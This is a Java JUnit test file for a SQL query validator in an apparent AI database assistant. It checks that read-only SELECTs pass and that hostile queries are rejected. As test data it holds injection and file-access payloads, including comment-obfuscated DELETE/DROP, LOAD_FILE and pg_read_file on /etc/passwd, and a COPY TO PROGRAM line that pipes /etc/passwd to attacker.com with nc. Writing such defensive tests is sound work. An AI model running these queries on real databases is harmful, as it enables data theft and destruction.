package com.example.aidatabaseassistant.query;

import com.example.aidatabaseassistant.entity.DatabaseSchema;
import com.example.aidatabaseassistant.entity.TableMetadata;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.*;

class QueryValidatorTest {

    private QueryValidator queryValidator;
    private DatabaseSchema schema;

    @BeforeEach
    void setUp() {

        queryValidator = new QueryValidator();

        TableMetadata customers =
                TableMetadata.builder()
                        .name("customers")
                        .build();

        TableMetadata orders =
                TableMetadata.builder()
                        .name("orders")
                        .build();

        schema =
                DatabaseSchema.builder()
                        .tables(List.of(customers, orders))
                        .build();
    }


    // =========================================================
    // SELECT - CÁC TRƯỜNG HỢP HỢP LỆ
    // =========================================================

    @Test
    void shouldAllowValidSelect() {

        String sql =
                "SELECT * FROM customers";

        assertDoesNotThrow(() ->
                queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldAllowSelectWithWhere() {

        String sql =
                "SELECT full_name FROM customers WHERE city = 'Hanoi'";

        assertDoesNotThrow(() ->
                queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldAllowJoin() {

        String sql = """
                SELECT c.full_name, o.id
                FROM customers c
                JOIN orders o ON c.id = o.customer_id
                """;

        assertDoesNotThrow(() ->
                queryValidator.validate(sql, schema)
        );
    }

    @Test
    void shouldAllowSubquery() {

        String sql = """
                SELECT full_name FROM customers
                WHERE id IN (SELECT customer_id FROM orders WHERE id > 10)
                """;

        assertDoesNotThrow(() ->
                queryValidator.validate(sql, schema)
        );
    }

    // =========================================================
    // CASE VARIATION
    // =========================================================

    @Test
    void shouldAllowSelectRegardlessOfKeywordCase() {

        String sql =
                "sElEcT * fRoM customers";

        assertDoesNotThrow(() ->
                queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldAllowMixedCaseSelectWithJoin() {

        String sql = """
                SeLeCt c.full_name, o.id
                FrOm customers c
                jOiN orders o ON c.id = o.customer_id
                """;

        assertDoesNotThrow(() ->
                queryValidator.validate(sql, schema)
        );
    }


    // =========================================================
    // COMMENT HANDLING
    // =========================================================

    @Test
    void shouldAllowSelectWithNormalSqlComment() {

        String sql =
                "SELECT * FROM customers -- comment";

        assertDoesNotThrow(() ->
                queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectBlockComment() {

        String sql =
                "SELECT /* comment */ * FROM customers";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    // =========================================================
    // COMMENT INJECTION / READ-ONLY BYPASS
    // =========================================================

    @Test
    void shouldNotAllowCommentToBypassReadOnlyCheck() {

        String sql =
                "SELECT * FROM customers /* */ ; DELETE FROM customers";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectCommentObfuscatedUpdate() {

        String sql =
                "UPD/*comment*/ATE customers SET full_name = 'Hacked'";

        assertThrows(
                Exception.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectCommentObfuscatedDelete() {

        String sql =
                "DEL/*comment*/ETE FROM customers";

        assertThrows(
                Exception.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectCommentObfuscatedDrop() {

        String sql =
                "DR/*comment*/OP TABLE customers";

        assertThrows(
                Exception.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectCommentObfuscatedTruncate() {

        String sql =
                "TRUN/*comment*/CATE TABLE customers";

        assertThrows(
                Exception.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    // =========================================================
    // COMMENT BETWEEN SELECT KEYWORDS
    // =========================================================

    @Test
    void shouldNotBypassParserWithCommentBetweenSelectKeywords() {

        String sql =
                "SEL/*comment*/ECT * FROM customers";

        assertThrows(
                Exception.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldNotBypassParserWithCommentBetweenFromKeywords() {

        String sql =
                "SELECT * FR/*comment*/OM customers";

        assertThrows(
                Exception.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectSlashStarCommentObfuscation() {

        String sql =
                "SELECT/**/*/**/FROM customers";

        assertThrows(
                Exception.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    // =========================================================
    // READ-ONLY SECURITY
    // =========================================================

    @Test
    void shouldRejectInsert() {

        String sql =
                "INSERT INTO customers(full_name) VALUES ('Test')";

        assertThrows(
                ReadOnlyViolationException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectUpdate() {

        String sql =
                "UPDATE customers SET full_name = 'Test'";

        assertThrows(
                ReadOnlyViolationException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectDelete() {

        String sql =
                "DELETE FROM customers";

        assertThrows(
                ReadOnlyViolationException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectDrop() {

        String sql =
                "DROP TABLE customers";

        assertThrows(
                ReadOnlyViolationException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectAlter() {

        String sql =
                "ALTER TABLE customers ADD COLUMN test VARCHAR(100)";

        assertThrows(
                ReadOnlyViolationException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectTruncate() {

        String sql =
                "TRUNCATE TABLE customers";

        assertThrows(
                ReadOnlyViolationException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    // =========================================================
    // MULTIPLE STATEMENTS
    // =========================================================

    @Test
    void shouldRejectMultipleStatements() {

        String sql =
                "SELECT * FROM customers; DELETE FROM customers";

        IllegalArgumentException exception =
                assertThrows(
                        IllegalArgumentException.class,
                        () -> queryValidator.validate(sql, schema)
                );

        assertTrue(
                exception.getMessage().contains(
                        "Chỉ cho phép đúng 1 câu lệnh SQL"
                )
        );
    }

    // =========================================================
    // FILE ACCESS PROTECTION (INTO OUTFILE / DUMPFILE / LOAD_FILE)
    // =========================================================

    @Test
    void shouldRejectSelectIntoOutfile() {

        String sql =
                "SELECT * FROM customers INTO OUTFILE '/tmp/dump.csv'";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectSelectIntoOutfileRegardlessOfCase() {

        String sql =
                "select * from customers into outfile '/tmp/dump.csv'";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectSelectIntoDumpfile() {

        String sql =
                "SELECT * FROM customers INTO DUMPFILE '/tmp/dump.bin'";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectLoadFileFunction() {

        String sql =
                "SELECT LOAD_FILE('/etc/passwd') FROM customers";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    // =========================================================
    // FILE ACCESS PROTECTION - POSTGRESQL
    // =========================================================

    @Test
    void shouldRejectPgReadFileFunction() {

        String sql =
                "SELECT pg_read_file('/etc/passwd') FROM customers";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectPgReadFileFunctionRegardlessOfCase() {

        String sql =
                "select PG_READ_FILE('/etc/passwd') from customers";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectPgReadBinaryFileFunction() {

        String sql =
                "SELECT pg_read_binary_file('/etc/passwd') FROM customers";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectPgLsDirFunction() {

        String sql =
                "SELECT pg_ls_dir('/tmp') FROM customers";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectLoExportFunction() {

        String sql =
                "SELECT lo_export(o.id, '/tmp/dump.bin') FROM orders o";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectLoImportFunction() {

        String sql =
                "SELECT lo_import('/etc/passwd') FROM customers";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectCopyToFile() {

        String sql =
                "COPY customers TO '/tmp/dump.csv'";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectCopyFromSubqueryToProgram() {

        String sql =
                "COPY (SELECT * FROM customers) TO PROGRAM 'nc attacker.com 4444 < /etc/passwd'";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectCopyRegardlessOfCase() {

        String sql =
                "copy customers to '/tmp/dump.csv'";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldNotFalsePositiveOnColumnNamedCopy() {

        // "copy" chỉ nguy hiểm khi là LỆNH Ở ĐẦU statement (COPY table TO
        // ...). Một câu SELECT hợp lệ có cột tên là "copy" (ví dụ số bản
        // sao/lượt copy) không được phép bị chặn nhầm.
        String sql =
                "SELECT copy FROM customers";

        assertDoesNotThrow(() ->
                queryValidator.validate(sql, schema)
        );
    }


    // =========================================================
    // OTHER DDL / SESSION STATEMENTS
    // =========================================================

    @Test
    void shouldRejectCreateTable() {

        String sql =
                "CREATE TABLE hacked (id INT)";

        assertThrows(
                ReadOnlyViolationException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }


    @Test
    void shouldRejectUnionBasedInjectionAgainstUnknownTable() {

        String sql =
                "SELECT full_name FROM customers UNION SELECT password FROM users";

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(sql, schema)
        );
    }

    // =========================================================
    // SCHEMA SECURITY
    // =========================================================

    @Test
    void shouldRejectUnknownTable() {

        String sql =
                "SELECT * FROM products";

        IllegalArgumentException exception =
                assertThrows(
                        IllegalArgumentException.class,
                        () -> queryValidator.validate(sql, schema)
                );

        assertTrue(
                exception.getMessage().contains(
                        "Bảng không tồn tại"
                )
        );
    }

    // =========================================================
    // DUPLICATE ALIAS
    // =========================================================

    @Test
    void shouldRejectDuplicateAliases() {

        String sql = """
                SELECT
                    SUM(id) AS total,
                    COUNT(*) AS total
                FROM orders
                """;

        IllegalArgumentException exception =
                assertThrows(
                        IllegalArgumentException.class,
                        () -> queryValidator.validate(
                                sql,
                                schema
                        )
                );

        assertTrue(
                exception.getMessage()
                        .contains("alias bị trùng")
        );
    }


    @Test
    void shouldAllowDifferentAliasesForDifferentMetrics() {

        String sql = """
                SELECT
                    SUM(id) AS total_revenue,
                    COUNT(*) AS total_orders
                FROM orders
                """;

        assertDoesNotThrow(() ->
                queryValidator.validate(
                        sql,
                        schema
                )
        );
    }


    @Test
    void shouldRejectDuplicateAliasesRegardlessOfCase() {

        String sql = """
                SELECT
                    SUM(id) AS TOTAL,
                    COUNT(*) AS total
                FROM orders
                """;

        assertThrows(
                IllegalArgumentException.class,
                () -> queryValidator.validate(
                        sql,
                        schema
                )
        );
    }
}